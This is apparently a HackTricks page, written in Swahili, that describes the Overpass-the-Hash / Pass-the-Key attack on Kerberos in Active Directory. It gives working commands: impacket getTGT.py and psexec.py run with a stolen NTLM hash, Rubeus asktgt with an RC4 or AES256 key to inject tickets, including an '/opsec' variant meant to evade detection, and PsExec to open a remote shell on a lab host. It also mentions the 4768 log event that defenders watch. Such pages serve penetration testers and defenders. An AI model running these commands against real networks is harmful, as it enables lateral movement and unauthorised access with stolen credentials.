# Over Pass the Hash/Pass the Key

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Overpass The Hash/Pass The Key (PTK)

Shambulio la **Overpass The Hash/Pass The Key (PTK)** limeundwa kwa mazingira ambapo itifaki ya kawaida ya NTLM imezuiliwa, na uwakilishi wa Kerberos unapewa kipaumbele. Shambulio hili linatumia hash ya NTLM au funguo za AES za mtumiaji ili kupata tiketi za Kerberos, kuruhusu ufikiaji usiohalali kwa rasilimali ndani ya mtandao.

Kutekeleza shambulio hili, hatua ya kwanza inahusisha kupata hash ya NTLM au nenosiri la akaunti ya mtumiaji anayelengwa. Baada ya kupata habari hii, Tiketi ya Kutoa Tiketi (TGT) kwa akaunti inaweza kupatikana, kuruhusu mshambuliaji kupata huduma au mashine ambazo mtumiaji ana ruhusa ya kufikia.

Mchakato unaweza kuanzishwa kwa amri zifuatazo:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Kwa hali ambazo zinahitaji AES256, chaguo la `-aesKey [ufunguo wa AES]` linaweza kutumika. Zaidi ya hayo, tiketi iliyopatikana inaweza kutumika na zana mbalimbali, ikiwa ni pamoja na smbexec.py au wmiexec.py, kuongeza wigo wa shambulio.

Matatizo yanayokutwa kama _PyAsn1Error_ au _KDC hawezi kupata jina_ kwa kawaida yanatatuliwa kwa kusasisha maktaba ya Impacket au kutumia jina la mwenyeji badala ya anwani ya IP, kuhakikisha utangamano na KDC ya Kerberos.

Mfululizo wa amri mbadala ukitumia Rubeus.exe unaonyesha nyanja nyingine ya mbinu hii:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Mbinu hii inafanana na njia ya **Pass the Key**, ikilenga kuchukua udhibiti na kutumia tiketi moja kwa moja kwa madhumuni ya uwakilishi. Ni muhimu kuzingatia kuwa kuanzishwa kwa ombi la TGT husababisha tukio la `4768: Tiketi ya uwakilishi wa Kerberos (TGT) ilihitajika`, ikionyesha matumizi ya RC4-HMAC kwa chaguo-msingi, ingawa mifumo ya Windows ya kisasa inapendelea AES256.

Ili kuzingatia usalama wa uendeshaji na kutumia AES256, amri ifuatayo inaweza kutumika:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Marejeo

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye repo ya [hacktricks](https://github.com/carlospolop/hacktricks) na [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
